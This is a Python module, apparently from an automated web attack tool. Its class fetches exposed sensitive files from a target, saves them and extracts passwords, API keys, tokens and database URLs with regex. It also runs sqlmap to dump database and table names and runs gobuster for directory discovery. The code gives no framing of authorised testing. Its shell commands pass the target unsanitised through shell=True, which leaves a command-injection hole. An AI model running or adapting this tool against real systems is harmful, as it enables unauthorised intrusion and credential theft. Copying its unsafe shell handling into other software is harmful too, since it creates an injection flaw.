import requests
import re
import subprocess
from config import Config

class WebAttacks:
    def __init__(self, target, output_dir, logger, kali_available):
        self.target = target
        self.output_dir = output_dir
        self.logger = logger
        self.kali_available = kali_available
        self.vulnerabilities = []

    def check_exposed_files(self):
        """Check for common sensitive files"""
        self.logger.scan("Checking for exposed files...")
        
        for file in Config.SENSITIVE_FILES:
            for scheme in ['http', 'https']:
                url = f"{scheme}://{self.target}/{file}"
                try:
                    resp = requests.get(url, timeout=3, verify=False)
                    if resp.status_code == 200:
                        self.logger.found(f"Exposed file: {url}")
                        self.vulnerabilities.append(f"Exposed file: {file}")
                        
                        # Save the file
                        filename = file.replace('/', '_')
                        with open(f"{self.output_dir}/exposed_{filename}", 'wb') as f:
                            f.write(resp.content)
                        
                        # Look for credentials
                        content = resp.text
                        self.search_credentials(content)
                except:
                    pass
                    
    def search_credentials(self, content: str):
        """Search for credentials in content"""
        patterns = {
            'password': r'password["\s:=]+([^"\s,}]+)',
            'db_pass': r'db_pass["\s:=]+([^"\s,}]+)',
            'DB_PASS': r'DB_PASS["\s:=]+([^"\s,}]+)',
            'API_KEY': r'api_?key["\s:=]+([A-Za-z0-9_\-]{16,})',
            'token': r'token["\s:=]+([A-Za-z0-9_\-]{20,})',
            'secret': r'secret["\s:=]+([^"\s,}]+)',
            'DATABASE_URL': r'DATABASE_URL["\s:=]+([^"\s,}]+)'
        }
        
        for name, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) > 3:
                    self.logger.found(f"Potential credential - {name}: {match}")
                    
    def run_sqlmap(self):
        """Run SQL injection testing"""
        if not self.kali_available:
            return
        
        self.logger.scan("Running sqlmap...")
        try:
            for scheme in ['http', 'https']:
                url = f"{scheme}://{self.target}"
                cmd = f"sqlmap -u {url} --batch --random-agent --level 3 --risk 2 --threads 10 --time-sec 5 --output-dir={self.output_dir}/sqlmap --dbs --tables --no-cast 2>/dev/null"
                subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
                self.logger.success("SQLMap scan completed")
                break
        except Exception as e:
            self.logger.warning(f"SQLMap error: {e}")
            
    def run_gobuster(self):
        """Directory enumeration"""
        if not self.kali_available:
            return
        
        self.logger.scan("Running gobuster...")
        try:
            extensions = "php,html,txt,sql,bak,env,yml,json,py,js,conf,config"
            cmd = f"gobuster dir -u http://{self.target} -w /usr/share/wordlists/dirb/common.txt -x {extensions} -t 50 -o {self.output_dir}/gobuster.txt 2>/dev/null"
            subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            self.logger.success("Gobuster scan completed")
        except Exception as e:
            self.logger.warning(f"Gobuster error: {e}")
